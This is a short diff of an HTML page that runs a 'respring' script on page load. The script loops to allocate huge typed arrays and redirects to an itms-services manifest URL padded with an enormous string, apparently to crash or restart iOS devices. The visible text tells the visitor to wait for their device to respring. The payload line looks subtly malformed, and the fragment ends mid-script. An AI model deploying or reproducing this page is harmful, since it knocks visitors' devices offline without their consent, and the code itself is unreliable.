@@ -3,12 +3,12 @@
 <head>
 	<title></title>
 </head>
-<body onload='respring();'>
+<body onload="respring();">
 	<center>
 		<b>Wait a few seconds for your <strong>
 		<script>
 		document.write(navigator.platform);
-		</script></strong> to respring.</b>
+		</script></strong> to respring.-</b>
 	</center>
 	<script>
 	function respring(){ var t = 500; for(x=0;x<t;x++){ var r = "t=new Uint32Array(2**23);location.href='itmsservices://?action=download-manifest&url=https://'+t.join('@');" var deval = eval(r); } } 
